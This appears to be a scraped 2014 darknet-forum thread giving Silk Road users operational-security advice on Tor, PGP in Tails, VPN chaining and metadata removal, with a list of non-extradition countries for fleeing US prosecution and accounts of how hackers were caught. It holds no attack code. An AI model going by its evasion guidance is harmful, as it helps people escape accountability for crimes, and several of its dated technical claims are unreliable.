registrarâthe renewal was processed not by Domains By Proxy but by its parent, Go Daddy. Unlike Domains By Proxy, Go Daddy uses real information when it updates the WHOIS database, so on 24th June (the day before it was due to expire), Monsegur's name, address, and telephone number were all publicly attached to his domain name.Monsegur quickly remedied the mistake, changing the WHOIS registration to use various other identitiesâfirst to that of Adrian Lamo (who reported Bradley Manning to authorities) and then to ""Rafael Lima"" and subsequently to ""Christian Biermann"". This attempt to mislead those relying on the WHOIS information successfully misled some would-be doxers. But not all: by August there were extensive dossiers on Sabu's true identity.;An unemployed computer programmer, welfare recipient and legal guardian of two young children.âIt was because of his kids,â one of the two agents recalled. âHeâd do anything for his kids. He didnât want to go away to prison and leave them. Thatâs how we got him.âMonsegur was quietly arrested on aggravated identity theft charges and released on bail. On Aug. 15 he pleaded guilty to a dozen counts of hacking-related charges and agreed to cooperate with the FBI."

The following countries do not currently have an extradition treaty to the United States.      This does not mean that these countries will not extradite you, but if you are going to pick a country to flee to, it would be favorable to your chance to choose from this list. One noteable country on this list, which is famous for extraditing one of the owners of the  Pirate Bay,  Gottfrid Svartholm to Sweden, is Cambodia. Although no treaty exists between the two countries, he was extradited by the government.      We all know that Edward Snowden fled to Russia from Hong Kong after leaving the US from Hawaii and has remained there since without being extradited by the government and was granted a 1 year temporary asylum. It is unclear if Snowden will be able to stay longer than his 1 year temporary asylum grants, but as of right now he is badly wanted by the US government, and Russia is refusing to hand him over.      Another person involved in the Pirate Bay named Fredrik Neij fled to Laos in Asia following being convicted of ""assisting in making copyright content available"" and was sentenced to one year in prison and ordered to pay damages of 30 million SEK (approximately â¬2,740,900 or US$3,620,000). This is of course between Laos and Sweden, but Laos has not extradited Fredrik, so Laos may be a valid option.     I often hear people from the US claim that if ""shit ever pops off"" they would just flee to Canada. Do not even try it, you would not even make it through the border. Canada is like the baby brother of the United States. When the United States says jump, Canada says ""how high?"". Stay away from Canada if you are running from the United States. Even a pot activist named Mark Emery who was a Canadian citizen, lived in Canada, but sold marijuana seeds over the internet to people in the US was extradited to the US to serve a 5 year sentence. According to the other seed vendors in the area, those who only sold within Canada had never been arrested, but because Emery sold to the US, he was arrested and extradited. And of course, we know that Ireland and Australia will likely be extraditing two of the moderators from Silk Road to the United States soon enough.     Although not on the list above, a woman, wanted in the US for parental kidnapping, named Chere Lyn Tomayko was granted asylum in Costa Rica.   http://www.usatoday.com/news/topstories/2008-07-25-3841863361_x.htm       Assata Shakur was charged with murder, attempted murder, armed robbery, bank robbery, and kidnapping by the US and fled to Cuba. Cuba actually has an extradition treaty with the US, but the relations between the two countries have not been good since the cold war between the US and the Soviet Union and thus the requests were not honored, even for someone with such serious charges. Cuba may be an option for you, but again this is only something to consider as I am no expert in any way.     And finally according to a previous post of mine explaining how the Secret Service sold fake IDs online to people on a forum, several of the members of that forum were able to evade capture due to being in Eastern European countries, although not specified by the feds for obvious reasons, and remain at large to this day.  http://www.tested.com/tech/456882-how-secret-service-sold-fake-ids-catch-identity-crooks/  ","Afghanistan, Algeria, Andorra, Angola, Armenia, Bahrain, Bangladesh, Belarus, Bosnia andHerzegovina, Brunei, Burkina Faso, Burma, Burundi, Cambodia, Cameroon, Cape Verde, the CentralAfrican Republic, Chad, China, Comoros, Congo (Kinshasa), Congo (Brazzaville), Djibouti, EquatorialGuinea, Eritrea, Ethiopia, Gabon, Guinea, Guinea-Bissau, Indonesia, Ivory Coast, Kazakhstan,Kosovo, Kuwait, Laos, Lebanon, Libya, Macedonia, Madagascar, Maldives, Mali, Marshall Islands,Mauritania, Micronesia, Moldova, Mongolia, Montenegro, Morocco, Mozambique, Namibia, Nepal,Niger, Oman, Qatar, Russia, Rwanda, Samoa, SÃ£o TomÃ© & PrÃ­ncipe, Saudi Arabia, Senegal, Serbia,Somalia, Sudan, Syria, Togo, Tunisia, Uganda, Ukraine, United Arab Emirates, Uzbekistan, Vanuatu,Vatican, Vietnam and Yemen.;Tomayko's claims that her actions were justified by domestic violence she suffered were taken into account by the Costa Rican authorities.;The government made its move in 2012, arresting dozens of fraudsters in the US and in countries where extradition is easy. But many more, including the founder of Cards.ru, remain at large. Those in Eastern European countries, especially, are largely out of the government's reach."
"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:30:59","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," Greetings comrades.           Through my research I have put together some security measures that should be considered by everyone. The reason I put this together is mainly for the newbies of this forum. But if I can help anyone out, then I am grateful for this. I would like to start out by saying, if you are reading like, you are likely a Silk Road user. If this is the case, then the #1 thing you must be using to even access this form is  Tor. Tor will provide you with a degree of anonymity by using an 128-bit AES (Advanced Encryption Standard). There has been some debate as to whether or not the NSA can crack this code, and the answer is likely yes. This is why, you should never send anything over Tor that you aren't comfortable sharing with the entire world unless you are using some sort of PGP encryption which we will talk about later.           Communication from your computer, to the internet relies on an entry node which basically ""enters your computer"" into the Tor network. This entry node communicates with your computer, this entry node knows your IP address. The entry node then passes your encrypted request onto the relay node. The relay node communicates with the entry node and the exit node but does not know your computer's IP address. The exit node, is where your request is decrypted and sent to the internet. The exit node does not know your computer's IP, only the IP of the relay node. Using this model of 3 nodes it makes it harder, but not impossible to correlate your request to your original IP address.            The problem comes obviously when you are entering plain text into TOR because anybody can set up an exit node. The FBI can set up an exit node, the NSA, or any other foreign government, or any malicious person who may want to steal your information. You should not be entering any sensitive data into any websites, especially when accessing them over TOR. If any of the nodes in the chain are compromised, and some likely are, and the people in charge of those compromised nodes have the computing power to decrypt your request, then you better hope it wasn't anything sensitive.            So what can we do to fix this? Well, luckily we are now having more and more servers that are offering something called Hidden services. You can easily recognize these services by the address  .onion. These services offer what's called end-to-end encryption. What this does is take the power out of the compromised exit nodes and put them back in your hands. The web server of the hidden service now becomes your exit node, which means the website you are visiting is the one decrypting your message, not some random exit node ran by a potential attacker. Remember, the exit node has the key to decrypt your request. The exit node can see what you are sending in clear text once they decrypt it. So if you are entering your name and address into a field, the exit node has your information. If you are putting a credit card, a bank account, your real name, even your login information, then you are compromising your identity.                    Another step you can take, is to only visit websites that use something called HTTP Secure. You can tell if the website you are visiting is using HTTP Secure by the prefix at the beginning of the address. If you see  https:// then your website is using HTTP Secure. What this does is encrypts your requests so that only the server can decrypt them, and not somebody eavesdropping on your communication such as a compromised Tor exit node. This is another form of end-to-end encryption. If somebody were to intercept your request over HTTP Secure, they would see encrypted data and would have to work to decrypt it.            Another reason you want to use HTTPS whenever possible, is that malicious Tor nodes can damage or alter the contents passing through them in an insecure fashion and inject malware into the connection. This is particularly easier when you are sending requests in plain text, but HTTPS reduces this possibility. You must be made aware however, that HTTPS can also be currently cracked depending on the level of the key used to encrypt it. When you visit a website using HTTPS, you are encrypting your request using their public key and they are decrypting it using their private key. This is how cryptography works. A public key is provided to those who want to send an encrypted message and the only one who can decrypt is the one with the private key.            Unfortunately, many websites today are still using private keys that are only 1,024 bits long which in today's world are no longer enough. So you need to make sure you find out which level of encryption the website you are visiting uses, to make sure they are using at a minimum 2,048, if not 4,096 bits. Even doing all of this unfortunately is not enough, because we have another problem. What happens if the web server itself has become compromised? Maybe your TOR nodes are clean, maybe you have used HTTPS for all your requests, but the web server itself of the website you are visiting has been compromised. Well then all your requests are again, as good as plain text.   With that being said, this will conclude the first post in this series of the steps we can take to protect our privacy online, to remain anonymous and maintain our freedom.",""

Let's learn how to use PGP within Tails. First thing you are going to want to do is create your own personal key, which consists of your public key that you can give out to people or post in your profiles online. As mentioned before, this is the key people use to encrypt messages to send to you. Your personal key also consists of your private key which you can use to decrypt messages that are encrypted using your PGP public key.     If you look up to the top right area, you will see a list of icons, and one o them looks like a clipboard. You need to click on that clipboard and click  Manage Keys  Next click  File -> New Select PGP Key and click Continue Fill out your full name (I suggest you use your online name, not your real name) Optionally fill out an email and a comment as well. Next, click Advanced Key Options. Make sure Encryption type is set to RSA and set key strength to 4096. Once you have done this, click Create and it will generate your key.     Once you have done this, you can view your personal key by clicking the tab  My Personal Keys. You have now created your personal key! To find your PGP public key, you right click on your personal key and click Copy and it will copy your PGP public key to your clipboard, in which you can paste anywhere you wish.

If you are running Tails from a USB drive, then you must use a separate drive to store your key on. If you are running Virtual Box, you want to  right click on the icon in the bottom right corner that looks like a USB drive, and select your separate drive that you will be using to store your keys on. Again, never store your private keys on your hard drive, keep them OFF your computer.      To save your private key, you are going to right click on your personal key and click Properties. I know you probably saw where it says Export, but this is not what you want to do. Clicking export will ONLY export your public key and will not save your private key. If you lose your private key, you can never recover it even if you create another personal key using the exact same password. Each private key is unique to the time it was created and if lost, is lost forever. So once you have clicked  Properties, go over to the tab  Details and click  Export Complete Key.      Once you have done this, you have saved your personal key for future use once you restart Tails. Remembering that Tails is not installed on your hard drive, so every time you restart Tails you lose all your keys. By saving your keys onto a USB drive or SD card, you can import your keys for use every time you restart it.      Next you are going to want to learn how to encrypt and decrypt messages using your key. Well, luckily for me, Tails has already made a tutorial on how to do this, so I will refer you to their webpage. But before I do that, I need to mention that you need to find somebody else's PGP public key, or you can practice by using your own. Needless to say, the way you import other people's keys into what's called your  key ring is by loading them into a text file. You do this with the program called  gedit Text Editor.     Click Applications -> Accessories -> gedit Text Editor and enter in someone's public key and hit save. Next you can return to your key program from the clipboard icon and click File -> Import and select that file. It will import that person's public key into your key ring. To add future public keys to your key ring, I suggest reopening the same file and just adding the next key below the previous key and each time you open that file it will load all keys within that file. This way you can keep all the PGP public keys together in one file and save it on your SD card or USB drive for future use.     Finally you can use the following 2 pages to learn how to encrypt and decrypt messages using PGP.  https://tails.boum.org/doc/encryption_and_privacy/gpgapplet/public-key_cryptography/index.en.html  https://tails.boum.org/doc/encryption_and_privacy/gpgapplet/decrypt_verify/index.en.html     Until next time. Have fun with your new found ability to communicate in PGP!",""

Unfortunately they busted him on an unrelated charge relating to child pornography and seized all his servers. Whether or not he was related to child porn or not, is unknown to me, or it could be a silly charge the feds slapped him with but either way, the feds ended up injecting malicious Javascript into his servers so that when users would visit certain sites, this malicious code would execute on their computers and reveal information about their computers to the feds. I suggest you read the following article to learn more about this.  https://openwatch.net/i/200/         With that being said, you may want to disable Javascript in your browsers, especially when visiting certain websites like Silk Road that may become compromised one day. Many users refuse to visit the original Silk Road website and forums with Javascript enabled because the feds likely injected it with malicious Javascript to identify users.      In Tails, the browser is called Iceweasel and when Tor in ran in Windows, it uses Firefox. Both browsers can disable Javascript using the exact same method. Open up a Window and type the following command in the address bar, ""about:config"" and click the button that says ""I'll be careful, I promise.""      This will bring up a bunch of settings including a search bar at the top. Enter javascript in the search bar and look for the following two entries, ""javascript.enabled"" and ""browser.urlbar.filter.javascript"". Right click on these and click ""Toggle"" and you will see the Value changed to false. If you want to enable Javascript again, just click Toggle again and you will see the value change back to true.     Again, remember that every time you restart Tails you will have to do this again, so get into a habit of doing this every time. You never know when your favorite website could become compromised.      Moving onto meta data. There is a bit of a famous story about an online hacker named w0rmer that would take pictures of his girlfriend and post them online after he would deface a webpage. What he either forgot, or didn't know was that photos taken with the iPhone and other smart phones save the GPS coordinates of where the picture was taken and store it in the meta data of the picture. Check out this article below.   https://encyclopediadramatica.es/W0rmer     You need to remove this meta data! Otherwise you could end up in federal prison with w0rmer. Luckily Tails has a solution for this! See why I love Tails?      Applications -> Accessories -> Metadata Anonymisation Toolkit     Please get a more clear idea of how this works by reading the following page.  https://mat.boum.org/     Please note the currently supported formats. In terms of pictures, jpg, jpeg and png. But unfortunately MAT is not perfect and I wouldn't solely rely on it, so a better idea would be to never upload pictures of yourself or your significant other online, especially bragging about a hack you committed. Please read the site provided above for more information. ",""
"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:36:54","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," I forgot to mention above when talking about metadata, that when it comes to photos, there is another risk involved called EXIF data, this is another form of meta data specifically related to images and may not be properly removed by Metadata Anonymisation Toolkit mentioned before.     EXIF data stands for  Exchangeable image file format and affects JPG, JPEF, TIF and WAV files. A photo taken with a GPS-enabled camera can reveal the exact location and time it was taken, and the unique ID number of the device - this is all done by default - often without the user's knowledge.      In December 2012, anti-virus programmer John McAfee was arrested in Guatemala while fleeing from alleged persecution in Belize, which shares a border. Vice magazine had published an exclusive interview with McAfee ""on the run"" that included a photo of McAfee with a Vice reporter taken with a phone that had geotagged the image. The photo's metadata included GPS coordinates locating McAfee in Guatemala, and he was captured two days later.     To avoid this, only take photos that use PNG because it does not store EXIF data. To check if your photo has any revealing EXIF data attached to it, check out this site.  http://www.viewexifdata.com/  or you can download a tool by doing a quick search online to see what EXIF data may be contained in your photos before you upload them. Be very careful with any files that you upload online, because you never know what type of harmful data could be attached in them. It helps to use Tails, but always consider everything you put online as a potential piece of evidence to be used against you and always prepare for the day the feds come to your door.",""
"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:38:57","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," Welcome back readers!     Today I want to talk about a greatly debated topic.   Should I use a VPN with TOR?  Should I use TOR to connect to a VPN, or use a VPN to connect to TOR?     Let me say first of all, that when you are browsing the internet without TOR, you should probably be using a VPN regardless of whether or not you are using TOR. And make sure that the VPN uses some form of encryption as well. For those of you who are very beginner, think about when you connect to a public wifi network at a coffee shop, or an airport and you get all these warnings that your requests sent over this network are vulernable.      All networks, but especially public wifi networks are vulnerable to traffic analysis. Put this together with the fact that some internet service providers monitor your activity to some level, and you can see why it might be a good idea to always use an encrypted method of using the internet. At the very least to protect your personal information when you are entering credit cards, usernames and passwords, as well as other personal data online. Again, especially if you are using a public wifi network.      Choosing a VPN that uses at least 128 bit encryption like TOR is good practice, and will stop the majority of eavesdroppers. But if you can get 256 bit encryption, you are even safer. Before we get into whether or not we should be using a VPN together with TOR, I want to give you a few warnings regarding how you should be using a VPN.     If you are going to be using a VPN for any type of freedom fighting, make damn sure that your VPN does not keep logs. This is actually a lot harder than you might think. Many VPN providers will claim to not keep logs of your activity in order to gain you as a customer, because they have to compete with the other providers out there. Customers are going to trend towards providers who offer no identifying data retention. Unfortunately, this claim of theirs is not always the real case and I will give you an example.     There is a well known VPN provider named HideMyAss that previously claimed not to keep logs of its users. Unfortunately, when met with a court order from their government in the UK, they handed over evidence of a suspected hacker from an internet group LulzSec which helped lead to his arrest. The story can be found below.  http://www.theregister.co.uk/2011/09/26/hidemyass_lulzsec_controversy/     One of the take home quotes from this article is the following.      A very smart man that goes by the online handle The Grugq, said when doing your freedom fighting online that nobody is going to go to jail for you, and he is 100% correct. When it comes down to it, no VPN provider is going to risk jail to protect a $20 a month subscriber. No matter how tough they sound, no matter how much they claim to care about protecting their customers, when faced with a choice to give you up or go to jail, they will always choose freedom.     Another thing to consider however, is using a VPN does hide your internet activity from your internet service provider. It can also hide the fact that you are using TOR, which may flag some suspicion when the feds start asking ISPs to provide data about their users. This may or may not be relevant, since many people use TOR and you can argue there are many legitimate reasons to use TOR and nothing suspicious about TOR. But it is just another factor to arouse suspicion that may or may not come into play and should be considered.      If you choose to use TOR over a VPN, the benefits are that you would be again, hiding from your ISP the fact that you are using TOR. Also, your VPN would only be able to see that you are connecting to TOR nodes and that you are sending encrypted data. The VPN would not be able to see what data you are sending over TOR unless they decrypted it, because remember, all information relayed over TOR is encrypted.      The downsides of course, as mentioned are that VPN providers may or may not log everything that you do in the form of meta data or even content if they have the storage capacity, and keep those logs on hand for a long time. In this case, it is no better than connecting to TOR through an ISP. Another thing to mention to those who will use VPNs when not using TOR, but also use VPNs when using TOR is remember when you are, and are not connected to your VPN. Sometimes VPNs can unexpectedly drop connections and you may not even be aware of it. If the reason you are using a VPN is to hide TOR activity from your ISP, then if your VPN drops, your ISP will start seeing your TOR traffic instead.     Or, maybe you forget that you are connected to your VPN and end up punching in your address on Google Maps to find directions somewhere. Well guess what Google does with all data entered into their system? They keep it. And they likely keep it indefinitely. So if one day the NSA identifies you on the TOR network by occupying a large number of nodes and using traffic analysis to identify you based on statistical analysis, it will link them to your VPN IP address.      At this point, they will likely ask the VPN to turn over data on their users, but if the VPN refuses to comply because they are not subject to US law, or the laws of other countries, they may check some of the big surveillance websites out there to see if you slipped up and used that IP address for anything else online. They will check logs from Google, Yahoo, Facebook, Twitter, Netflix and other big data collection companies to see who has been using that IP address to connect to their servers.     If you accidentally punched in your address on Google when connected to that VPN, you are now a suspect. So always keep things like this in mind. Just because you are covered behind a VPN does not mean you are not traceable by human error. The benefits of TOR, are that you get a new identity every time you connect. This may or may not be the case with your VPN, so please check and make sure.     Next post we will talk about the advantages and disadvantages of using TOR to connect to a VPN.","We are not intimidated by the US government as some are claiming, we are simply complying with our countries legal system to avoid being potentially shut down and prosecuted ourselves."
"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:41:06","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," After a long search, I have found a way you can connect TOR -> VPN. It is not perfect, and some might not agree with doing things this way, but it works and I am giving it to you as an option, but it only works for Windows users at this time.     If you look back at my previous posts regarding combining VPN and TOR then you will find the reasons why you would want to do so, and some of the reasons why you might not want to do it. But I was unable to provide you with a way to connect to a VPN using TOR so that the VPN does not know who you are. When it comes to TOR -> VPN, if you cannot trust your VPN, which you rarely should, then keeping your identity anonymous from your VPN is a good idea. Also, with more and more people using TOR, but with only around 4000 TOR exit nodes, many of the exit node IP addresses are being flagged as spammers on popular websites and limiting the usage of well meaning TOR users to post on message boards like Stack Exchange and so forth.     The way that I found you can do TOR -> VPN is by using a virtual machine, preferrably Virtual Box and running another instance of Windows, preferrably one that uses less memory than your current version. You also want to run TOR Expert and Tortilla on your host OS. I talk about how to do this in previous posts. Next set your Virtual Box to route all it's network traffic through Tortilla (bridge adapter), which routes it all through TOR. Currently Tortilla is only supported by Windows, which is why this option is only available to Windows users at this time. Doing this also makes it easier to do things like watch videos on YouTube.      Now that you have your Windows Virtual Machine running on TOR, you can install a VPN of your choice, preferrably one using OpenVPN on your Windows Guest OS and connect to it. Check your IP address before connecting and after and you should see a different IP address. If all went well, you now have a virtual machine running TOR -> VPN. Then if you want to add another layer, you can download TOR browser bundle onto your virtual machine and run that as well giving you TOR -> VPN -> TOR for another layer of security.  Also you have the option using this method to use a VPN on your host OS, then Tor Expert with Tortilla, then another VPN on your guest OS, then TOR browser, giving you VPN -> TOR -> VPN -> TOR.     I am not advocating any whcih method, you need to make that decision on your own, I am just giving you the knowledge necesary to make an informed decison and you can ultimately choose which method you feel most comfortable with. Sometimes doing TOR -> VPN is necessary because of the spam filter reasons I mentioned above and other times having TOR as your last node to the internet is necessary like when accessing the onion network. It is completely up to you and I know that we are trying to shy away from Windows usage because of all the exploits and other reasons spoken about in the previous posts, but if you have no other way of staying anonymous from your VPN than this, then I think it is a good compromise until we have something like Tortilla that is compatible with Linux distributions.

"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:44:03","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," A little change of pace for this next post. I want to talk about one of our fallen moderators Libertas.     It has finally been confirmed, what we all were hoping for that  Libertas, one of the 3 arrested moderators was released on bail recently according to an article.  http://techcrunch.com/2014/01/07/the-silk-roads-libertas-is-free-to-the-annoyance-of-us-authorities/      So as you can see, just because Libertas was a moderator on the site, he is being charged with allowing transactions to faciliate sales of drugs. He is basically being charged as a drug dealer.      He unfortunately was found with drugs on him at the time of his arrest, which made things much easier to keep him in custody. And it turns out that the alleged former owner of Silk Road, Ross Ulbricht is fully complying with law enforcement to attempt to identify senior vendors on Silk Road. According to the article, Ross communicated with the vendors frequently and likely in plain text (is my guess).      The reason I bring this up, is that we need to remind every user on here of the mistakes that were made by Ross, and the other three moderators so that we can hopefully learn from them. We need to avoid these types of mistakes, never ever EVER give anybody any personal information about yourself online. The story goes, that Ross required moderators to give him copies of their IDs in order to become moderators of Silk Road, and he likely kept a record of these on his computer. Unfortunately, these are now in the hands of the FBI and 3 moderators have been arrested as a result since. And now, according to the article, they are after senior vendors as well.     A few take homes are; Always use PGP encryption in all your communications, which unfortunately in this case would not have mattered because Ross ended up giving up his private keys to the feds. But it is still another hurdle in their way to protect you from them taking away your freedom. Never give out any personal information to anybody online about yourself. Never put your trust in somebody else's hands, because at the end of the day, nobody is going to go to jail for you. Ross found an opportunity to possibly reduce his sentence and he is fully taking advantage of the opportunity.     This exact same scenario happened with Sabu from LulzSec was threatened with 112 years in prison, he quickly turned on all his friends and worked with the feds to get them all locked up to help reduce his sentence. Sabu has 2 kids and obviously decided he would rather snitch out his friends and have a chance at being a father rather than spend the rest of his life locked up in jail. Again,  nobody is going to go to jail for you.","The Silk Road moderator Gary Davis, aka Libertas, is officially free on bail and awaiting an extradition hearing on February 13.The FBI flew to Ireland that night for the express purpose of taking Davis into custody and interrogating him in Ireland, with regard to his position and functions âbeing a moderator on a website allowing transactions to facilitate the sale of drugs online.â;However, Davis was found in possession of illicit substances which could result in a minimum sentence."

"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:47:03","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," We are continuing the subject of how others were taken down after Sabu was compromised and started cooperating with the FBI. According to this article.     http://arstechnica.com/tech-policy/2012/03/stakeout-how-the-fbi-tracked-and-busted-a-chicago-anon/      So we see here Sabu is chatting with a user  sup_g to try and engage him about the hacks that took place.   And more details on how they looked through copious amounts of logs to correlate this user  sup_g to his real identity.      This is why you all need to be extra paranoid with every single thing you say about yourselves on this forum. I have seen people talking about what country they live in, some even talking about which state they live in. If you think that the FBI will never put the pieces together, you may be sadly mistaken as Jeremy Hammond found out.      If this does not open your eyes to some of the mistakes many of you have been making online, then you need to reevaluate how you handle yourselves online. Read the entire article to get a better picture, but remember, I do not care if it is your best friend from elementary school, do not, under any circumstances ever admit anything online to anybody. Never under any circumstances take credit for any freedom fighting or hacktivism you have participated it online. And for christ's sake, NEVER log into a server, especially one that keeps logs with your real IP address!","The day after Christmas, sup_g had another online chat about the Stratfor hack and about some 30,000 credit card numbers that had been taken from the company. His interlocutor, CW-1, engaged in a bit of gallows humor about what might happen should they all get caught.But the raid had, in fact, already happened. CW-1 was ""Sabu,"" a top Anon/LulzSec hacker who was in real life an unemployed 28-year old living in New York City public housing. His sixth-floor apartment had been visited by the FBI in June 2011, and Sabu had been arrested and ""turned."" For months, he had been an FBI informant, watched 24 hours a day by an agent and using a government issued laptop that logged everything he did. ;Sabu suddenly addresses sup_g by a new name, ""anarchaos."" It would turn out that sup_g went by many names, including ""anarchaos,"" ""burn,"" ""yohoho,"" ""POW,"" ""tylerknowsthis,"" and ""crediblethreat."" CW-1: if I get raided anarchaos your job is to cause havok in my honorCW-1: <3CW-1: sup_g:@sup_g: it shall be soNormally, the attempt to link his various names would have raised the hacker's guard; as he confided to Sabu, someone else had once tried to link the names ""yohoho"" and ""burn,"" but the hacker ""never answered... I think he picked up some language similarities I've worked with [REDACTED] on other ops in the past."" But this was Sabu, a sort of hacker demigod in the world of Anonymous. If you couldn't trust him, who could you trust? Sabu had even provided a server to store the stolen Statfor data, so he couldn't be a fed (in reality, he had done so at the FBI's direction).;To identify sup_g, the Bureau first turned to the voluminous chat logs stored on Sabu's computer. They went through every comment that could be plausibly linked to sup_g or one of his aliases. The goal was to see if the hacker had slipped up at any point and revealed some personal information.He had. On August 29, 2011 at 8:37 AM, ""burn"" said in an IRC channel that ""some comrades of mine were arrested in St. Louis a few weeks ago... for midwestrising tar sands work."" If accurate, this might place ""burn"" in the Midwest. FBI Chicago agents were able to confirm that an event called Midwest Rising was attended by Chicago resident Jeremy Hammond's twin brother. (Hammond had a history with anarchism and violent protest.)""Anarchaos"" once let slip that he had been arrested in 2004 for protesting at the Republican National Convention in New York City. Much later, ""yohoho"" noted that he hadn't been to New York ""since the RNC,"" nicely tying both online handles to the same person. The FBI went to New York City police and obtained a list of every individual detained at the 2004 convention; they learned that Jeremy Hammond had in fact been detained, though he had not been arrested. The pieces were starting to fit.""Sup_g"" and ""burn"" both indicated later that they had spent time in prison, with âburnâ indicating that he had been at a federal penitentiary. A search of Hammond's criminal records revealed that he had been arrested in March 2005 by the Chicago FBI and had pled guilty to hacking into a âpolitically conservative website and stealing its computer database, including credit card information,â according to an FBI affidavit. Hammond was sentenced to two years in prison for the action.In yet another chat, ""Anarchaos"" told Sabu that he had once spent a few weeks in a county jail for possession of marijuana. He also asked Sabu not to tell anybody, âcause it could compromise my identity,"" and he noted that he was on probation. Both matched Hammond, who was placed on probation in November 2010 after a violent protest against the Olympics coming to Chicago. When the FBI ran a criminal history check on Hammond, it also revealed two arrests for marijuana possession.The FBI was so thorough that it even followed up on a ""POW"" comment saying ""dumpster diving is all good i'm a freegan goddess."" (""Freegans"" scavenge unspoiled, wasted food from the trash of grocery stores and restaurants.) The FBI went to Chicago authorities, who had put Hammond under surveillance when they were investigating him back in 2005. As part of that earlier surveillance, âagents have seen Hammond going into dumpsters to get food.âNow that they had a suspect, it was time to put him under surveillance.;Watching the WiFi network revealed the Media Access Control (MAC) addresses of each device connected to the network. Most of the time there was only one, an Apple Computerâand sup_g had told Sabu that he used a Macbook. On March 1, the agents obtained a court order allowing them to use a ""pen register/trap and trace"" device that could reveal only ""addressing information"" and not content. In other words, if it worked, agents could see what IP addresses Hammond was visiting, but they would see nothing else.His Macbook's MAC address was soon seen connecting to IP addresses known to be part of the Tor anonymizing network.And while this definitely sounded like their man, the Bureau went to even greater lengths to double-check their target. The main technique was to observe when Hammond left his home, then to call Sabu in New York and ask if any of Hammond's suspected aliases had just left IRC or the Jabber instant messaging system. "

"The Hub Forums","Jolly Roger","52.0","2014-01-15T16:39:59","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," Ok, now let us talk about why you may want to connect to a VPN over TOR.      The data flow would look like this. You -> Tor -> VPN -> Internet     The benefits of doing that are as follows. You are more anonymous to your VPN in case they happen to keep logs, or if you do something using the VPN that you are not supposed to and a website or server grabs your VPN IP address. In the case of this happening, even if the VPN manages to keep logs of everything you do, they can only identify you as an anonymous TOR user as long as you did not purchase the service like an idiot with your credit card or Paypal account. If you use Bitcoin, and made sure the the Bitcoin trail is not easily traceable you should be okay. Some websites block TOR users from connecting to their websites or servers, by using your VPN to appear as the exit node, you are hiding your TOR activity from the website you are visiting and hopefully bypassing their filters.     Another advantage, is that if your VPN connection does drop, your fall back will be your TOR IP address instead of your real IP address. And finally, if you are passing through a compromised TOR exit node, your information will remain encrypted through the VPN's encryption protocol until it reaches the exit node of the VPN. This is a good thing if you are passing through a compromised exit node, but do not forget that the VPN could be logging everything you are doing anyways.  Do not trust anybody who has access to your unecrypted data!     A few of the downsides of doing things this way, as mentioned in the previous post are that your ISP knows you are using TOR, when and for how long. This may or may not matter to you, but it is just something to consider. Second, you will be unable to visit hidden services websites. Remember those  .onion sites we talked about in the beginning? You need to be connected to the TOR network to visit those hidden service websites.       But I am connected to TOR aren't I? Yes you are, but your final method of communicating with the internet does not come from the TOR network, it comes from your VPN. And your VPN is likely not configured for TOR. In order for you to be able to connect to a hidden services, you must either be connected directly to TOR, or use a VPN to connect to TOR. TOR must be your final node of connectivity in order to visit onion websites.      The choice is ultimately up to you, and every person in every state, province and country will have different reasons for wanting to do VPN to TOR or TOR to VPN, or just TOR, or just VPN. Whatever choice you make, please keep all the things mentioned in this post and the previous post in mind. None of these methods will save you if you enter anything identifying about yourself online. Do not log into your Facebook account using your VPN. Do not check your email or search a nearby address on Google using your VPN. In fact, stay away from Google altogether unless absolutely necessary.     There are two other search engines out now that do not store information about their users.      #1 - DuckDuckGo. They have both a clearnet URL and a hidden services URL for both types of users.    https://www.duckduckgo.com    http://3g2upl4pq6kufc4m.onion/ - Please note the hidden services mirror is not HTTPS     #2 - StartPage. This server also does not store any information about its users.    https://www.startpage.com     Before we move on, I want to go back to how to choose a good VPN. When looking for a VPN provider, you will most likely come across two protocols to choose from. Find out which one your VPN provider is using before you sign up with them. PPTP and OpenVPN. At this time, I am going to highly recommend that you avoid PPTP and stick with OpenVPN providers. Check out this site for a quick comparison.  http://www.goldenfrog.com/vyprvpn/openvpn-vs-pptp     As you can see, PPTP uses a weaker encryption, 128-bit versus 160-bit to 256-bit for OpenVPN. It offers basic security versus a high level of security using something called digital certificates. This is basically a way to make sure they data coming in is sent from your VPN provider and not injected by some malicious third party because the incoming and outgoing data are signed using specially obtained certificates, similar to showing your ID to get into a a restricted area.     The only downside is that setting up OpenVPN can be a little challenging for the less technical users, but there are plenty of great tutorials online to set up OpenVPN providers and your VPN provider itself will likely help you get set up as well. PPTP has been abandoned by those who demand the highest level of security, so I would recommend to avoid it. A third option for VPN providers is L2TP/IPsec, but many users now believe it has also been compromised by the NSA due to its weaker levels of encryption and should be avoided as well.  Stick with OpenVPN.     Lastly, if you want to know how to connect to TOR over a VPN. If you are using OpenVPN like I recommended, then you it is really quite simple. Make sure you are connected to your VPN, check your IP address to on any website such as  WhatIsMyIpAddress.com to make sure it has changed. Then, open TOR or open TAILS and start using TOR and you are now connected to TOR over a VPN.      Connecting to a VPN over TOR is a more tricky and currently above my skill set since OpenVPN reconfigures your network routes so Tor can't be running on the same host. As soon as I figure it out, I will post a tutorial, and if anybody can share an easy way to connect a VPN over TOR, then please share it with this thread.    UPDATE  A method of connecting to a VPN over TOR has been added to this thread but is currently only able to be used by Windows users. You can read it about it at the link below.

